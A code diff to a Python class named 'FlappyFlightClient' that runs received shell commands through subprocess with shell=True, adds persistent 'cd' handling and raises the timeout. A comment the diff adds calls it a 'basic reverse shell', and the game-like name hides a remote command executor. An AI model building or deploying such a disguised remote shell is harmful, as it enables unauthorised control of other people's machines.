@@ -100,21 +100,46 @@ class FlappyFlightClient:
         if not self.is_command_allowed(command):
             return f"[✗] Command not allowed: '{command}'\n[i] Only safe, predefined commands are permitted."
 
+        # Handle 'cd' internally to maintain state between commands
+        if command.startswith("cd "):
+            target_dir = command[3:].strip()
+            # Handle special paths
+            if target_dir == "~":
+                target_dir = os.path.expanduser("~")
+            elif target_dir == "-":
+                target_dir = os.environ.get("OLDPWD", os.getcwd())
+            
+            try:
+                oldpwd = os.getcwd()
+                os.chdir(target_dir)
+                os.environ["OLDPWD"] = oldpwd
+                return f"[i] Changed directory to {os.getcwd()}"
+            except FileNotFoundError:
+                return f"[✗] Directory not found: {target_dir}"
+            except PermissionError:
+                return f"[✗] Permission denied: {target_dir}"
+            except Exception as e:
+                return f"[✗] Failed to change directory: {e}"
+
         try:
+            # Note: For interactive commands like nano/vim, subprocess.run with capture_output=True 
+            # will hang or fail since there's no real TTY. We just execute them and capture standard output,
+            # but fully interactive terminal apps won't work perfectly over this basic reverse shell.
+            # However, for simulation purposes, we allow them to execute.
             result = subprocess.run(
                 command,
                 shell=True,
                 capture_output=True,
                 text=True,
-                timeout=10,
-                cwd=os.path.expanduser("~"),
+                timeout=15, # Increased timeout for things like wget/scp
+                cwd=os.getcwd(), # Use the actual current working directory
             )
             output = result.stdout
             if result.stderr:
                 output += f"\n[stderr]: {result.stderr}"
             return output if output.strip() else "[i] Command executed (no output)."
         except subprocess.TimeoutExpired:
-            return "[!] Command timed out (10s limit)."
+            return "[!] Command timed out (15s limit)."
         except Exception as e:
             return f"[!] Error executing command: {str(e)}"
 
